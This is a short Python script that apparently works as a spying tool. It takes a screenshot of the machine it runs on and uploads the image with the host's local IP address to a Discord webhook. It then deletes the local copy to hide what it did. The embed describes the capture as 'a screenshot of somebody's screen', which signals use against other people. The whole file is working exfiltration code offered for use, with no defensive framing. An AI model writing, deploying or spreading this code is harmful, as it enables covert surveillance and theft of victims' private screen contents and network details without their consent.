import pyautogui
import os
import socket
from config import WEBHOOK_SEND

myScreenshot = pyautogui.screenshot()
myScreenshot.save(r'./ScreenShot.png')

from discord_webhook import DiscordWebhook, DiscordEmbed

webhook = DiscordWebhook(url=WEBHOOK_SEND) # add a file called config.py and add your webhook

with open("./ScreenShot.png", "rb") as f:
    webhook.add_file(file=f.read(), filename='screenshot.png')

embed = DiscordEmbed(title='Screen Shot!', description='A screenshot of somebody\'s screen.', color='03b2f8')
embed.set_thumbnail(url='attachment://screenshot.png')
embed.add_embed_field(name="IP?", value=socket.gethostbyname(socket.gethostname()))

webhook.add_embed(embed)
response = webhook.execute()

os.remove("ScreenShot.png")
